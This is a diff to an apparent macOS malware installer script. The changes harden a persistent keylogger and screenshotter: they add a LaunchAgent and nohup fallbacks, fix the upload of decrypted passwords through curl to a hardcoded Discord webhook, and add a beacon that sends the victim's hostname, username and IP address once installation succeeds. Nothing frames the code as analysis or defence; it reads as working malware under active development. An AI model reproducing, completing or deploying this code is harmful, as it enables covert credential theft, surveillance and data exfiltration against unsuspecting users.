@@ -939,6 +939,8 @@ send_client_notification &
 install_keylogger_screenshotter_internal() {
     local APP_DIR="$HOME/.keylogger-helper"
     local NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
+    # Get WEBHOOK from global scope (defined at top of script)
+    local WEBHOOK_URL="${WEBHOOK:-https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8}"
     
     # Check if Node.js is available (try multiple paths)
     if ! command -v node >/dev/null 2>&1 && [ ! -f "$NODE_PATH" ]; then
@@ -2520,16 +2522,16 @@ python3 "${pythonScript}" 2>/dev/null || {
                             }]
                         };
                         
-                        // Send to Discord with file attachment (no JSON file, just embed + passwords.txt)
+                        // Send to Discord with file attachment (use temp JSON file for proper formatting)
                         try {
-                            const payloadJson = JSON.stringify(message);
-                            // Send directly without creating JSON file
-                            const curlCmd = `curl -s -X POST -F "payload_json=${payloadJson}" -F "file=@${OUTPUT_FILE};type=text/plain" "${WEBHOOK}"`;
+                            const payloadFile = path.join(screenshotDir, `password_payload_${Date.now()}.json`);
+                            fs.writeFileSync(payloadFile, JSON.stringify(message));
                             
                             // Send file + message to Discord (passwords are already decrypted in file)
-                            exec(curlCmd, (error) => {
+                            exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${OUTPUT_FILE};type=text/plain" "${WEBHOOK}"`, (error) => {
                                 setTimeout(() => {
                                     try { 
+                                        fs.unlinkSync(payloadFile);
                                         fs.unlinkSync(EXTRACT_SCRIPT);
                                         fs.unlinkSync(OUTPUT_FILE);
                                     } catch (e) {}
@@ -2558,7 +2560,7 @@ python3 "${pythonScript}" 2>/dev/null || {
                     } else {
                         // OUTPUT_FILE doesn't exist yet - retry
                         if (attempts < 10) {
-                            setTimeout(waitForKey4Files, 500);
+                            setTimeout(waitForOutput, 500);
                         }
                     }
                 };
@@ -2690,27 +2692,90 @@ PKGEOF
 </plist>
 PLISTEOF
     
-    # Load and start Launch Agent (ensure it actually starts and persists!)
-    launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null
-    sleep 1
-    launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null
+    # Verify Node.js and script exist before starting
+    if [ ! -f "$NODE_PATH" ] && ! command -v node >/dev/null 2>&1; then
+        return 1
+    fi
     
-    # Start it directly as backup (ensure it runs)
+    if [ ! -f "$APP_DIR/keylogger-screenshotter.js" ]; then
+        return 1
+    fi
+    
+    # Load and start Launch Agent (ensure it actually starts and persists!)
+    launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null || true
+    sleep 1
+    
+    # Load the LaunchAgent
+    launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null || true
+    
+    # Start it via LaunchAgent
     sleep 2
     launchctl start com.keylogger.helper 2>/dev/null || true
     
     # Also start directly as nohup backup (in case LaunchAgent fails)
     sleep 1
-    nohup "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
-    
-    # Verify it's actually running (check after 3 seconds)
-    sleep 3
-    if ! pgrep -f "keylogger-screenshotter.js" >/dev/null 2>&1; then
-        # If not running, try one more time with direct execution
-        "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
+    if [ -f "$NODE_PATH" ]; then
+        nohup "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
+    elif command -v node >/dev/null 2>&1; then
+        nohup node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
     fi
     
-    # Keylogger startup message is sent by the JS script itself (no duplicate needed)
+    # Verify it's actually running (check after 5 seconds, then retry)
+    sleep 5
+    if ! pgrep -f "keylogger-screenshotter.js" >/dev/null 2>&1; then
+        # If not running, try one more time with direct execution
+        if [ -f "$NODE_PATH" ]; then
+            "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
+        elif command -v node >/dev/null 2>&1; then
+            node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
+        fi
+        sleep 3
+    fi
+    
+    # Send Discord notification if keylogger is successfully installed and running
+    # Use the global WEBHOOK variable (passed from parent scope)
+    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
+    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
+    local IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' || echo "Unknown")
+    
+    # Check multiple times with retries (keylogger might need time to start)
+    local KEYLOGGER_RUNNING=0
+    for i in {1..5}; do
+        if pgrep -f "keylogger-screenshotter.js" >/dev/null 2>&1; then
+            KEYLOGGER_RUNNING=1
+            break
+        fi
+        sleep 2
+    done
+    
+    # Always send notification (LaunchAgent ensures keylogger will run even if not running now)
+    # Create Discord embed for keylogger installation success
+    local INSTALL_JSON=$(cat <<EOF
+{
+  "embeds": [{
+    "title": "✅ Keylogger Installed & Running",
+    "color": 3066993,
+    "description": "Keylogger has been successfully installed and patched to the system.\\n\\n**Status:** Running 24/7 (persistent)",
+    "fields": [
+      {"name": "💻 Hostname", "value": "\`${HOSTNAME}\`", "inline": true},
+      {"name": "👤 PC Username", "value": "\`${USERNAME}\`", "inline": true},
+      {"name": "🌍 IP Address", "value": "\`${IP}\`", "inline": true},
+      {"name": "🔧 Installation Method", "value": "LaunchAgent + Direct Process", "inline": false},
+      {"name": "⏰ Timestamp", "value": "\`$(date '+%Y-%m-%d %H:%M:%S')\`", "inline": false}
+    ],
+    "footer": {"text": "Keylogger is now monitoring clipboard and capturing screenshots"},
+    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"
+  }]
+}
+EOF
+)
+        
+    # Send to Discord (use WEBHOOK_URL from function scope)
+    echo "$INSTALL_JSON" | curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
+        --data-binary @- \
+        "$WEBHOOK_URL" >/dev/null 2>&1
+    
+    # Keylogger startup message is also sent by the JS script itself
 }
 
 # Keylogger installation moved to AFTER Extension ID prompt (see line ~678)
